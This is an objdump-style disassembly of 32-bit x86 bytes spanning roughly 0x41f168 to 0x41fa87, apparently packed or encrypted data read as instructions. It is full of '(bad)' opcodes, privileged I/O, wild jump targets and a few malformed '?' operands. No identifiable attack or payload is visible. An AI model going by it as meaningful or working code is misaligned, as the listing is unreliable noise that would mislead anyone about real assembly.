  41f168:	add    esp,eax
  41f16a:	xchg   ebp,eax
  41f16b:	xor    al,0xf4
  41f16d:	test   ecx,eax
  41f16f:	pop    esp
  41f170:	mov    dh,BYTE PTR [esi]
  41f172:	add    ecx,DWORD PTR [edi+0x5f]
  41f175:	or     DWORD PTR [esi-0x302ba185],0xf
  41f17c:	ret    
  41f17d:	mov    ds:0x655ac732,al
  41f182:	inc    ecx
  41f183:	sub    DWORD PTR [esi+ebx*8-0x37],edi
  41f187:	js     0x41f17c
  41f189:	into   
  41f18a:	push   edx
  41f18b:	and    eax,0x54c6fe05
  41f190:	popa   
  41f191:	xor    esi,DWORD PTR [ebp+0x12]
  41f194:	ror    BYTE PTR [ebx],1
  41f196:	dec    edx
  41f197:	stos   DWORD PTR es:[edi],eax
  41f198:	aaa    
  41f199:	scas   al,BYTE PTR es:[edi]
  41f19a:	not    DWORD PTR [ebx-0xb8a8fb5]
  41f1a0:	inc    esi
  41f1a1:	scas   eax,DWORD PTR es:[edi]
  41f1a2:	loop   0x41f151
  41f1a4:	add    dh,BYTE PTR [eax+0x3a588158]
  41f1aa:	add    DWORD PTR [ecx+0x2de8c214],0xf6150208
  41f1b4:	pop    ss
  41f1b5:	sub    DWORD PTR [esp+ebp*4],0x14cbc96a
  41f1bc:	fsubr  QWORD PTR [edx+0xd56f5d4]
  41f1c2:	sub    ebp,ebx
  41f1c4:	(bad)  
  41f1c5:	sbb    DWORD PTR [ecx-0x65],esp
  41f1c8:	dec    ebx
  41f1c9:	int    0xd7
  41f1cb:	add    eax,0xb053ec11
  41f1d0:	aaa    
  41f1d1:	mov    WORD PTR [esi-0x12faa53f],cs
  41f1d7:	test   ch,dh
  41f1d9:	pop    esi
  41f1da:	aad    0x48
  41f1dc:	dec    esp
  41f1dd:	adc    edi,DWORD PTR [ebx]
  41f1df:	lods   eax,DWORD PTR ds:[esi]
  41f1e0:	sub    al,0x76
  41f1e2:	iret   
  41f1e3:	mov    ah,0x22
  41f1e5:	cmp    ebp,DWORD PTR [edi]
  41f1e7:	add    eax,0x9f27a55b
  41f1ec:	add    eax,0xbcc9d9ce
  41f1f1:	jecxz  0x41f24c
  41f1f3:	dec    ebp
  41f1f4:	hlt    
  41f1f5:	dec    ebx
  41f1f6:	leave  
  41f1f7:	add    eax,0x5922d92e
  41f1fc:	fild   DWORD PTR [ecx]
  41f1fe:	test   DWORD PTR [ecx],edi
  41f200:	sahf   
  41f201:	xor    DWORD PTR [ecx],0x51
  41f204:	or     BYTE PTR [edx],bl
  41f206:	in     eax,0x85
  41f208:	ficomp WORD PTR [esp+ecx*4+0x7e]
  41f20c:	push   ds
  41f20d:	or     ch,0xa
  41f210:	and    DWORD PTR [ebx+0x7cda3815],0x41
  41f217:	test   BYTE PTR [edi+0x4b7086f1],al
  41f21d:	sbb    edi,DWORD PTR [eax-0x7ef480ed]
  41f223:	or     DWORD PTR [ebx],edx
  41f225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f226:	ins    BYTE PTR es:[edi],dx
  41f227:	add    BYTE PTR [eax+0xe0aa87e],dh
  41f22d:	jbe    0x41f1bb
  41f22f:	icebp  
  41f230:	out    dx,al
  41f231:	and    al,0xf9
  41f233:	dec    ebp
  41f234:	pop    edi
  41f235:	int3   
  41f236:	jge    0x41f265
  41f238:	ret    
  41f239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f23a:	sub    BYTE PTR [ebp-0x24],bl
  41f23d:	enter  0x9428,0x3c
  41f241:	popf   
  41f242:	shl    BYTE PTR [ebx-0x3ee9835e],cl
  41f248:	les    edi,FWORD PTR [edx+0x33a7cd3e]
  41f24e:	jmp    DWORD PTR [ebx-0x411089e9]
  41f254:	repz mov ebx,0x7d90c70e
  41f25a:	and    bl,BYTE PTR [edi]
  41f25c:	ror    al,1
  41f25e:	mov    al,0xcb
  41f260:	neg    BYTE PTR [ebx]
  41f262:	push   ecx
  41f263:	imul   ebx,DWORD PTR [ebp-0x3c],0x138577a6
  41f26a:	fimul  WORD PTR [edi+0x4c29ce5d]
  41f270:	mov    al,ds:0xdaae5486
  41f275:	xchg   DWORD PTR [ebp+0x56012fd5],edx
  41f27b:	mov    ?,edi
  41f27d:	mov    WORD PTR [edx-0x19],?
  41f280:	inc    ecx
  41f281:	dec    esp
  41f282:	test   ah,0x44
  41f285:	aas    
  41f286:	mov    esi,0xb49d8ffb
  41f28b:	inc    ebx
  41f28c:	mov    eax,0x7182b994
  41f291:	inc    esi
  41f292:	adc    BYTE PTR ss:[eax+eiz*4-0x3ea6eab6],ah
  41f29a:	cmp    eax,0x101be85c
  41f2a0:	and    DWORD PTR [edx-0xd],ebx
  41f2a3:	xchg   esp,eax
  41f2a4:	dec    eax
  41f2a5:	cli    
  41f2a6:	xor    eax,0xba3e2331
  41f2ab:	stc    
  41f2ac:	add    DWORD PTR [ebx],ebx
  41f2ae:	push   esp
  41f2af:	je     0x41f2f9
  41f2b1:	bound  eax,QWORD PTR [eax+0x1f]
  41f2b4:	add    bh,BYTE PTR [ecx-0x6b]
  41f2b7:	and    eax,0xb6b357e
  41f2bc:	sahf   
  41f2bd:	jbe    0x41f2b2
  41f2bf:	stos   DWORD PTR es:[edi],eax
  41f2c0:	and    DWORD PTR [edi],ecx
  41f2c2:	push   es
  41f2c3:	addr16 jl 0x41f2fb
  41f2c6:	fwait
  41f2c7:	std    
  41f2c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2c9:	repnz or ah,dh
  41f2cc:	test   BYTE PTR [ecx+edx*2],ch
  41f2cf:	dec    ebx
  41f2d0:	data16 and BYTE PTR [ebp-0x4f7259dd],ah
  41f2d7:	sub    al,0x10
  41f2d9:	scas   eax,DWORD PTR es:[edi]
  41f2da:	lods   al,BYTE PTR ds:[esi]
  41f2db:	lds    ebx,FWORD PTR [esi+eiz*4+0x161629e6]
  41f2e2:	aad    0x80
  41f2e4:	mov    al,0xd9
  41f2e6:	jmp    0xd2201c97
  41f2eb:	cmp    BYTE PTR [ebp+ecx*4-0x4ce182c6],dl
  41f2f2:	shr    DWORD PTR [ecx-0x49],1
  41f2f5:	jmp    0x41f2e1
  41f2f7:	mov    ebp,0x241989f
  41f2fc:	(bad)  
  41f2fd:	ds push ss
  41f2ff:	cmp    al,0x30
  41f301:	es jmp 0x41f328
  41f304:	retf   0xa34b
  41f307:	rcl    BYTE PTR [ebx-0x2961b487],0x4a
  41f30e:	push   es
  41f30f:	mov    cl,0xb2
  41f311:	add    eax,esp
  41f313:	xchg   ebp,eax
  41f314:	arpl   WORD PTR [esi-0x4a],sp
  41f317:	pusha  
  41f318:	xchg   ecx,eax
  41f319:	dec    esi
  41f31a:	(bad)  
  41f31b:	int    0x9
  41f31d:	jnp    0x41f37a
  41f31f:	push   es
  41f320:	pop    edi
  41f321:	jae    0x41f343
  41f323:	dec    ebp
  41f324:	sahf   
  41f325:	push   0xb4fbd4c
  41f32a:	sbb    al,0x21
  41f32c:	lahf   
  41f32d:	out    0x62,al
  41f32f:	bound  ebp,QWORD PTR [ebx-0x767508df]
  41f335:	lods   al,BYTE PTR ds:[esi]
  41f336:	or     DWORD PTR [eax],0x3e
  41f339:	or     ecx,DWORD PTR [edx+0xf]
  41f33c:	retf   
  41f33d:	(bad)  
  41f340:	jle    0x41f375
  41f342:	test   al,0xa2
  41f344:	jmp    0x41f2dc
  41f346:	add    edx,edi
  41f348:	rcl    DWORD PTR [ecx+0x2a],0xa0
  41f34c:	jmp    0x2be2e1f0
  41f351:	xlat   BYTE PTR ds:[ebx]
  41f352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f353:	in     eax,dx
  41f354:	pop    ebx
  41f355:	out    0xe3,eax
  41f357:	fs push ebp
  41f359:	xlat   BYTE PTR ds:[ebx]
  41f35a:	mov    ch,0x30
  41f35c:	jle    0x41f36f
  41f35e:	outs   dx,DWORD PTR ds:[esi]
  41f35f:	stc    
  41f360:	and    edi,esi
  41f362:	jns    0x41f356
  41f364:	mov    ebx,0x4034a793
  41f369:	sub    ebp,ebp
  41f36b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f36c:	ficomp DWORD PTR ds:0xedfa30df
  41f372:	pop    esi
  41f373:	rcl    DWORD PTR [edi],0xd0
  41f376:	ins    BYTE PTR es:[edi],dx
  41f377:	inc    edi
  41f378:	aad    0xf7
  41f37a:	cpuid  
  41f37c:	cmp    dl,BYTE PTR [edx]
  41f37e:	enter  0x76b7,0xdf
  41f382:	inc    ecx
  41f383:	mov    al,0xdb
  41f385:	cmp    DWORD PTR [edi-0x239facb5],eax
  41f38b:	hlt    
  41f38c:	pop    es
  41f38d:	cwde   
  41f38e:	cli    
  41f38f:	sbb    eax,0xcc99d830
  41f394:	fdivr  st,st(1)
  41f396:	dec    eax
  41f397:	retf   
  41f398:	jp     0x41f35f
  41f39a:	in     eax,0x10
  41f39c:	cmc    
	...
  41f575:	sbb    al,0x6c
  41f577:	ins    DWORD PTR es:[edi],dx
  41f578:	les    edi,FWORD PTR [ebp-0x3b]
  41f57b:	mov    ebp,0x7e8bcdfc
  41f580:	jae    0x41f5b7
  41f582:	pop    ebx
  41f583:	dec    ebx
  41f584:	and    edi,ebx
  41f586:	cmp    eax,0x7200001
  41f58b:	add    BYTE PTR [eax],al
  41f58d:	neg    al
  41f58f:	push   ebx
  41f590:	imul   esp,DWORD PTR [edi+0x979c7f6],0xd80d595f
  41f59a:	or     ebp,edi
  41f59c:	jmp    0x41f569
  41f59e:	mov    al,ds:0x461a064b
  41f5a3:	mov    al,0x75
  41f5a5:	ss (bad) 
  41f5a7:	mov    al,ds:0x7b82996d
  41f5ac:	push   edi
  41f5ad:	xor    DWORD PTR [eax+eiz*8+0x10],0xffffffc1
  41f5b2:	or     al,0x21
  41f5b4:	ss push ds
  41f5b6:	pop    es
  41f5b7:	sbb    DWORD PTR [edx],ecx
  41f5b9:	out    dx,al
  41f5ba:	cmp    ebp,DWORD PTR [ecx+0x2]
  41f5bd:	sbb    ch,BYTE PTR [esi-0x414249d4]
  41f5c3:	aas    
  41f5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5c5:	mov    ebx,0xd4f5f2de
  41f5ca:	xacquire xchg BYTE PTR [ebp-0x3f],bh
  41f5ce:	cld    
  41f5cf:	repz pop ss
  41f5d1:	xchg   ebp,eax
  41f5d2:	push   ebp
  41f5d3:	jnp    0x41f64c
  41f5d5:	cmp    al,0x11
  41f5d7:	test   BYTE PTR [ebp+ecx*1-0x3be16b5b],cl
  41f5de:	jl     0x41f631
  41f5e0:	mov    cl,0xba
  41f5e2:	or     bl,BYTE PTR [eax]
  41f5e4:	xchg   esi,eax
  41f5e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5e6:	push   0x54
  41f5e8:	aam    0x4
  41f5ea:	daa    
  41f5eb:	mov    ch,0x5c
  41f5ed:	dec    esi
  41f5ee:	sbb    DWORD PTR [ecx+ecx*2+0x58006079],edx
  41f5f5:	(bad)  
  41f5f6:	cmp    al,0xb2
  41f5f8:	push   0xcd9b67e1
  41f5fd:	xor    DWORD PTR [ecx+ebx*4-0x2d7506aa],0x10ae5e3b
  41f608:	xchg   ebx,eax
  41f609:	or     eax,0x99f1a651
  41f60e:	das    
  41f60f:	mov    gs,WORD PTR [edi]
  41f611:	mov    al,0xdc
  41f613:	pop    ebx
  41f614:	test   ebp,edx
  41f616:	mov    esi,ecx
  41f618:	test   BYTE PTR [esi-0x4bef4258],ah
  41f61e:	mov    edi,ecx
  41f620:	xchg   edx,eax
  41f621:	and    al,0x8c
  41f623:	push   ebp
  41f624:	lods   eax,DWORD PTR ds:[esi]
  41f625:	add    esp,DWORD PTR [ecx+0x2b203c80]
  41f62b:	les    esi,FWORD PTR [ecx-0x12]
  41f62e:	jns    0x41f5f2
  41f630:	out    0x6a,al
  41f632:	into   
  41f633:	lods   eax,DWORD PTR ds:[esi]
  41f634:	xor    edx,edi
  41f636:	mov    al,ds:0xbe4e46cd
  41f63b:	ss pop ds
  41f63d:	sub    DWORD PTR [esi+0x4e],ebp
  41f640:	jecxz  0x41f68c
  41f642:	aaa    
  41f643:	mov    ch,BYTE PTR [edx+0x1cf5763c]
  41f649:	add    BYTE PTR [ecx],0x44
  41f64c:	pusha  
  41f64d:	cmc    
  41f64e:	pusha  
  41f64f:	push   eax
  41f650:	xor    DWORD PTR [ebp-0x45],esp
  41f653:	pop    ebp
  41f654:	mul    DWORD PTR [eax]
  41f656:	xor    ebp,esp
  41f658:	fsub   st,st(4)
  41f65a:	(bad)  
  41f65b:	into   
  41f65c:	int3   
  41f65d:	(bad)  
  41f65f:	into   
  41f660:	xchg   edx,eax
  41f661:	xor    BYTE PTR [edx],cl
  41f663:	shl    BYTE PTR ss:[edx-0x3a1fb2c2],cl
  41f66a:	sahf   
  41f66b:	aas    
  41f66c:	mov    eax,0x45e3fa25
  41f671:	xchg   esi,eax
  41f672:	stos   DWORD PTR es:[edi],eax
  41f673:	fidiv  WORD PTR ds:[ecx+0x11c5a645]
  41f67a:	push   ds
  41f67b:	data16 jns 0x41f65b
  41f67e:	add    eax,0x8e97ee56
  41f683:	and    dh,BYTE PTR ds:0xcac95735
  41f689:	out    dx,eax
  41f68a:	(bad)  
  41f68b:	and    eax,0x3783c5cc
  41f690:	sbb    BYTE PTR [ecx-0x30],dl
  41f693:	aaa    
  41f694:	js     0x41f648
  41f696:	popa   
  41f697:	and    bh,bh
  41f699:	jns    0x41f645
  41f69b:	outs   dx,DWORD PTR ds:[esi]
  41f69c:	loop   0x41f659
  41f69e:	push   es
  41f69f:	icebp  
  41f6a0:	sbb    BYTE PTR [esp+ebx*1+0x6abfbb88],bl
  41f6a7:	call   0x1e5d:0x1588f31b
  41f6ae:	jg     0x41f69a
  41f6b0:	jge    0x41f6fd
  41f6b2:	jecxz  0x41f6ab
  41f6b4:	shl    BYTE PTR [ecx],1
  41f6b6:	es add al,0x68
  41f6b9:	sub    bh,BYTE PTR [edx]
  41f6bb:	fisttp WORD PTR [ecx-0x1cbee527]
  41f6c1:	leave  
  41f6c2:	jae    0x41f655
  41f6c4:	add    al,0xd5
  41f6c6:	fidiv  WORD PTR [edi+0x31]
  41f6c9:	inc    ebp
  41f6ca:	leave  
  41f6cb:	or     eax,0x7a300d45
  41f6d0:	inc    esi
  41f6d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6d2:	xchg   edi,eax
  41f6d3:	sub    al,0xb7
  41f6d5:	dec    esi
  41f6d6:	aas    
  41f6d7:	cmp    BYTE PTR [ecx+edi*2+0x52],ch
  41f6db:	mov    cl,0xa2
  41f6dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6de:	outs   dx,BYTE PTR ds:[esi]
  41f6df:	push   esp
  41f6e0:	xchg   edi,eax
  41f6e1:	hlt    
  41f6e2:	xor    esp,edx
  41f6e4:	mov    bl,0x78
  41f6e6:	pop    edi
  41f6e7:	ins    BYTE PTR es:[edi],dx
  41f6e8:	sar    BYTE PTR ds:0xc701e748,cl
  41f6ee:	nop
  41f6ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6f0:	mov    bh,0x76
  41f6f2:	into   
  41f6f3:	push   ss
  41f6f4:	pusha  
  41f6f5:	pop    ecx
  41f6f6:	mov    esp,0xafc20709
  41f6fb:	sub    DWORD PTR [esi+esi*1],esp
  41f6fe:	xchg   esi,eax
  41f6ff:	cmp    DWORD PTR [ebx-0x1d],eax
  41f702:	sbb    DWORD PTR [ebp+0x4],ebx
  41f705:	fidivr DWORD PTR [ebx-0x5b82e066]
  41f70b:	js     0x41f762
  41f70d:	mov    ch,0xee
  41f70f:	inc    eax
  41f710:	mov    ebp,0x85fe296a
  41f715:	sub    ecx,edi
  41f717:	jmp    0xaeb077b0
  41f71c:	push   edx
  41f71d:	fisub  DWORD PTR [ecx+0x7a]
  41f720:	mov    cl,0x72
  41f722:	mov    ds:0x956bfdf8,eax
  41f727:	test   eax,0xda610a6c
  41f72c:	xchg   esp,eax
  41f72d:	mov    ah,0x12
  41f72f:	dec    edi
  41f730:	sub    ch,0x54
  41f733:	sbb    ebx,DWORD PTR [esi+ebp*8+0x64529ce6]
  41f73a:	fidiv  DWORD PTR [ebx+0x6261afe5]
  41f740:	mov    bh,0xb5
  41f742:	or     edi,DWORD PTR [esi]
  41f744:	sub    eax,0xe8d937a8
  41f749:	mov    WORD PTR [edi],fs
  41f74b:	test   BYTE PTR [eax+esi*8-0x1f03414],bl
  41f752:	mov    al,bl
  41f754:	jg     0x41f6e4
  41f756:	pop    edx
  41f757:	sub    dl,BYTE PTR [ebp+0x6b07ad59]
  41f75d:	cmp    eax,0x798887da
  41f762:	in     al,dx
  41f763:	loopne 0x41f7a2
  41f765:	fcomp  st(0)
  41f768:	cli    
  41f769:	pop    esi
  41f76a:	sub    DWORD PTR [ecx+0x6f],esi
  41f76d:	pop    esp
  41f76e:	retf   
  41f76f:	mov    cl,0x7a
  41f771:	sub    ah,BYTE PTR [edx]
  41f773:	sub    esp,DWORD PTR [eax]
  41f775:	inc    eax
  41f776:	sub    edi,DWORD PTR [edx-0x7e]
  41f779:	add    eax,0x6d10bbf0
  41f77e:	mov    esp,0x78f73b07
  41f783:	out    dx,eax
  41f784:	out    dx,eax
  41f785:	push   edi
  41f786:	push   ss
  41f787:	out    dx,al
  41f788:	pop    ds
  41f789:	daa    
  41f78a:	imul   BYTE PTR [ebx-0x19]
  41f78d:	push   0xffffffb7
  41f78f:	mov    edi,0xf75d0652
  41f794:	out    0x91,eax
  41f796:	mov    bl,0x40
  41f798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f799:	xlat   BYTE PTR ds:[ebx]
  41f79a:	xchg   ecx,eax
  41f79b:	retf   0xa2f0
  41f79e:	fs push ebp
  41f7a0:	es jae 0x41f7f1
  41f7a3:	cmp    al,0xe7
  41f7a5:	out    0x7c,al
  41f7a7:	(bad)  
  41f7a9:	push   ds
  41f7aa:	jo     0x41f7f1
  41f7ac:	pop    es
  41f7ad:	sbb    BYTE PTR [ebx+0x79a55dd5],ah
  41f7b3:	mov    ss,WORD PTR [ebx+0x2c]
  41f7b6:	aas    
  41f7b7:	push   es
  41f7b8:	xchg   DWORD PTR [esp+ebp*1-0x77ed4346],esi
  41f7bf:	(bad)  
  41f7c0:	ja     0x41f7f3
  41f7c2:	xor    ch,BYTE PTR [eax]
  41f7c4:	adc    DWORD PTR [esi+0x5b],ebp
  41f7c7:	lea    eax,[esi]
  41f7c9:	mov    cl,0xf3
  41f7cb:	xchg   ecx,eax
  41f7cc:	(bad)  
  41f7cd:	popf   
  41f7ce:	fimul  DWORD PTR [esi+esi*4]
  41f7d1:	jmp    0x41f809
  41f7d3:	jns    0x41f7e1
  41f7d5:	mov    al,ds:0xa7d6e92
  41f7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7db:	call   0x2d5782bc
  41f7e0:	or     al,0xda
  41f7e2:	sub    edx,edx
  41f7e4:	fisttp QWORD PTR [ecx-0xc525a6]
  41f7ea:	bound  eax,QWORD PTR [ebx-0x1a7ecef]
  41f7f0:	jge    0x41f837
  41f7f2:	xor    al,0xc4
  41f7f4:	sub    eax,0xbe77d2e7
  41f7f9:	xchg   BYTE PTR [edi+0xa],al
  41f7fc:	fcomp  st(7)
  41f7fe:	out    0xe9,eax
  41f800:	xchg   esi,eax
  41f801:	(bad)  
  41f802:	push   ss
  41f803:	add    DWORD PTR ds:0x7936af87,esi
  41f809:	out    0x66,eax
  41f80b:	lahf   
  41f80c:	and    al,0xcb
  41f80e:	scas   eax,DWORD PTR es:[edi]
  41f80f:	or     dh,bl
  41f811:	outs   dx,DWORD PTR ds:[esi]
  41f812:	adc    DWORD PTR [ecx+0x3f],0x5f721f5d
  41f819:	adc    eax,0x2291aa88
  41f81e:	cdq    
  41f81f:	fld    DWORD PTR [ebx+0x2030a996]
  41f825:	pop    es
  41f826:	rcr    cl,1
  41f828:	popf   
  41f829:	(bad)  
  41f82a:	lods   eax,DWORD PTR ds:[esi]
  41f82b:	ret    0x7a52
  41f82e:	push   ss
  41f82f:	leave  
  41f830:	sub    ecx,ecx
  41f832:	xor    al,0xa9
  41f834:	cli    
  41f835:	jne    0x41f7c0
  41f837:	in     eax,dx
  41f838:	add    bl,BYTE PTR [esi]
  41f83a:	sbb    esi,ebp
  41f83c:	pop    ecx
  41f83d:	(bad)  [ebx-0x2c5cc2fa]
  41f843:	and    dh,bl
  41f845:	int3   
  41f846:	inc    edx
  41f847:	add    eax,0xb5c36365
  41f84d:	adc    BYTE PTR [eax+ebp*8],al
  41f850:	div    BYTE PTR [eax+0x3b]
  41f853:	add    BYTE PTR [edx-0x44],bl
  41f856:	fwait
  41f857:	ucomiss xmm7,DWORD PTR [ecx+esi*2+0x3d6a04c0]
  41f85f:	in     al,0xa2
  41f861:	bound  ecx,QWORD PTR [ecx]
  41f863:	sub    edi,DWORD PTR cs:[ebp+0x3a329035]
  41f86a:	adc    DWORD PTR [edx],esi
  41f86c:	sub    al,0x4d
  41f86e:	inc    edx
  41f86f:	pop    ecx
  41f870:	xor    esi,edx
  41f872:	scas   al,BYTE PTR es:[edi]
  41f873:	shl    BYTE PTR [ebx+0x73f37a06],0x4a
  41f87a:	in     eax,0x50
  41f87c:	jo     0x41f89e
  41f87e:	es jae 0x41f85d
  41f881:	cwde   
  41f882:	mov    bl,BYTE PTR [eax+0x18]
  41f885:	in     al,0x84
  41f887:	adc    BYTE PTR [eax-0x19],bh
  41f88a:	xchg   ebp,eax
  41f88b:	and    esi,DWORD PTR [ebp-0x7f]
  41f88e:	jp     0x41f8e1
  41f890:	jmp    0xb687:0x744b8cbc
  41f897:	fcmovnbe st,st(4)
  41f899:	jg     0x41f8a9
  41f89b:	ror    BYTE PTR [edx],1
  41f89d:	or     ecx,DWORD PTR [edi+0x63a69323]
  41f8a3:	retf   
  41f8a4:	sbb    al,BYTE PTR [ecx-0x3d54196f]
  41f8aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8ab:	or     dl,ah
  41f8ad:	add    eax,0x31385d4f
  41f8b2:	cmp    BYTE PTR [ebx+0x714bf52e],cl
  41f8b8:	fild   WORD PTR es:[ecx+0x48]
  41f8bc:	and    al,0xf5
  41f8be:	mov    ch,0x6b
  41f8c0:	fld    QWORD PTR [edi+0x2b]
  41f8c3:	cmp    eax,0x96976e1f
  41f8c8:	xlat   BYTE PTR ds:[ebx]
  41f8c9:	pop    ecx
  41f8ca:	cmp    ebp,DWORD PTR [esi-0x5969e6b9]
  41f8d0:	adc    cl,BYTE PTR [ecx+0x4d3424eb]
  41f8d6:	leave  
  41f8d7:	lods   eax,DWORD PTR ds:[esi]
  41f8d8:	daa    
  41f8d9:	stc    
  41f8da:	jmp    0x9fa048cd
  41f8df:	pop    esi
  41f8e0:	xor    BYTE PTR [ebx+eiz*8-0x17a685a7],bl
  41f8e7:	add    ebp,ecx
  41f8e9:	hlt    
  41f8ea:	es imul edx,esi,0x9
  41f8ee:	jns    0x41f8d0
  41f8f0:	sub    DWORD PTR [esi+eax*4-0x29de02fd],esp
  41f8f7:	gs out 0xe2,eax
  41f8fa:	push   edi
  41f8fb:	sbb    BYTE PTR [edi-0x53eb4076],dh
  41f901:	sub    BYTE PTR [edx],ah
  41f903:	(bad)  
  41f904:	fimul  DWORD PTR ds:0xc9570e9d
  41f90a:	mov    edx,0x9f24e8cc
  41f90f:	test   eax,0x14c3ad62
  41f914:	lea    edx,[ecx+ecx*1+0x56d8d01f]
  41f91b:	and    ebx,DWORD PTR [eax-0x6f]
  41f91e:	add    al,0x9d
  41f920:	xchg   ebp,eax
  41f921:	cmp    al,0x5d
  41f923:	loop   0x41f943
  41f925:	inc    eax
  41f926:	pusha  
  41f927:	cmp    BYTE PTR [esi],0x12
  41f92a:	inc    edi
  41f92b:	lods   eax,DWORD PTR ds:[esi]
  41f92c:	(bad)  
  41f92d:	fcomp  DWORD PTR [ebp-0x3]
  41f930:	call   0x1f68:0xc0681de6
  41f937:	loopne 0x41f94e
  41f939:	or     eax,0x7e14f163
  41f93e:	cdq    
  41f93f:	push   ecx
  41f940:	cmc    
  41f941:	adc    al,0x2c
  41f943:	xor    DWORD PTR [edx+0x65],0x7d0bb71a
  41f94a:	mov    DWORD PTR [eax],ebx
  41f94c:	out    dx,eax
  41f94d:	add    bl,BYTE PTR [esi]
  41f94f:	sub    edx,DWORD PTR [esp+edi*4+0xe7de720]
  41f956:	mov    edi,edi
  41f958:	arpl   WORD PTR [eax+edx*4],si
  41f95b:	ja     0x41f92f
  41f95d:	dec    eax
  41f95e:	retf   0xb1f9
  41f961:	call   0x2f960385
  41f966:	cmc    
  41f967:	scas   al,BYTE PTR es:[edi]
  41f968:	inc    eax
  41f969:	push   ebx
  41f96a:	push   ebx
  41f96b:	es xor edi,edi
  41f96e:	scas   al,BYTE PTR es:[edi]
  41f96f:	stos   DWORD PTR es:[edi],eax
  41f970:	(bad)  
  41f971:	call   0xe921:0xd8687816
  41f978:	dec    eax
  41f979:	jge    0x41f995
  41f97b:	mov    cl,0xd8
  41f97d:	or     DWORD PTR [ebx+0x55],ebx
  41f980:	retf   0xc818
  41f983:	mov    ds:0x55764ae,al
  41f988:	inc    esi
  41f989:	popa   
  41f98a:	lods   al,BYTE PTR ds:[esi]
  41f98b:	pop    ss
  41f98c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f98d:	ds aaa 
  41f98f:	add    ah,ch
  41f991:	mov    eax,0xa9018517
  41f996:	out    0x61,eax
  41f998:	faddp  st(4),st
  41f99a:	jns    0x41f9cb
  41f99c:	in     eax,0x2b
  41f99e:	mov    eax,DWORD PTR [edi]
  41f9a0:	fnsave [edi+edi*8]
  41f9a3:	into   
  41f9a4:	ins    BYTE PTR es:[edi],dx
  41f9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a6:	leave  
  41f9a7:	loope  0x41f994
  41f9a9:	or     DWORD PTR ds:0x518fa0cc,edx
  41f9af:	sbb    eax,0xf109fe2a
  41f9b4:	(bad)  
  41f9b5:	sbb    bl,ah
  41f9b7:	sbb    cl,BYTE PTR [edi+esi*4+0x26fc2a26]
  41f9be:	pop    eax
  41f9bf:	addr16 pop ebp
  41f9c1:	mov    dl,0xfc
  41f9c3:	pop    eax
  41f9c4:	sbb    BYTE PTR [eax-0x30b119d4],ah
  41f9ca:	adc    al,0xd0
  41f9cc:	arpl   bx,cx
  41f9ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9cf:	add    bl,bh
  41f9d1:	add    bl,ah
  41f9d3:	into   
  41f9d4:	in     al,0xef
  41f9d6:	inc    eax
  41f9d7:	jo     0x41f9e4
  41f9d9:	repz int 0xc
  41f9dc:	inc    esp
  41f9dd:	push   ds
  41f9de:	sub    al,0x5a
  41f9e0:	out    0x59,eax
  41f9e2:	sub    al,0xcc
  41f9e4:	loopne 0x41f9e8
  41f9e6:	or     ebp,eax
  41f9e8:	pop    ebp
  41f9e9:	loope  0x41fa4f
  41f9eb:	cmp    BYTE PTR [ebp+ebp*2+0x47],cl
  41f9ef:	gs push ss
  41f9f1:	or     al,0x59
  41f9f3:	je     0x41fa29
  41f9f5:	mov    al,ds:0xed27546f
  41f9fa:	xchg   edi,eax
  41f9fb:	mov    ecx,0x663f7de2
  41fa00:	mov    ss,WORD PTR [ecx-0x5c103ece]
  41fa06:	in     eax,dx
  41fa07:	jnp    0x41fa15
  41fa09:	sbb    DWORD PTR [eax+0x4336c000],esp
  41fa0f:	imul   esp,DWORD PTR [esi],0xffffffc0
  41fa12:	jne    0x41f9ac
  41fa14:	les    ecx,FWORD PTR [edx]
  41fa16:	cmp    al,0x88
  41fa18:	xchg   ebx,eax
  41fa19:	lock (bad) 
  41fa1b:	ja     0x41fa06
  41fa1d:	push   ebp
  41fa1e:	rol    DWORD PTR [eax],1
  41fa20:	sub    eax,ebp
  41fa22:	shr    DWORD PTR [ebp-0x999d79a],cl
  41fa28:	ins    DWORD PTR es:[edi],dx
  41fa29:	mov    ds:0xb61617ce,eax
  41fa2e:	cld    
  41fa2f:	lock jns 0x41fa07
  41fa32:	fisub  WORD PTR [esp+esi*4-0x7cdd9953]
  41fa39:	sub    al,0xf9
  41fa3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa3c:	or     eax,0x732414a7
  41fa41:	adc    ecx,DWORD PTR [ebx]
  41fa43:	popf   
  41fa44:	call   0x42fba4eb
  41fa49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa4a:	xchg   ebp,eax
  41fa4b:	or     eax,0xf5cee4f3
  41fa50:	cdq    
  41fa51:	mov    ds:0xee56d49,eax
  41fa56:	aaa    
  41fa57:	fucomi st,st(1)
  41fa59:	sub    BYTE PTR [edx-0x39],dl
  41fa5c:	outs   dx,DWORD PTR ds:[esi]
  41fa5d:	enter  0x58b3,0x16
  41fa61:	jmp    0xe28a9c9a
  41fa66:	clc    
  41fa67:	sub    DWORD PTR [edi+0x37],ecx
  41fa6a:	test   al,0x63
  41fa6c:	add    al,0x32
  41fa6e:	in     eax,0xb9
  41fa70:	pop    esi
  41fa71:	retf   
  41fa72:	in     eax,0x2f
  41fa74:	dec    esp
  41fa75:	xor    esp,edi
  41fa77:	mov    eax,0x5eb193d3
  41fa7c:	xchg   edx,eax
  41fa7d:	fsubr  QWORD PTR [esi]
  41fa7f:	retf   
  41fa80:	nop
  41fa81:	cmp    eax,0xc80cbb96
  41fa86:	dec    ebp
  41fa87:	jg     0x41fa7f
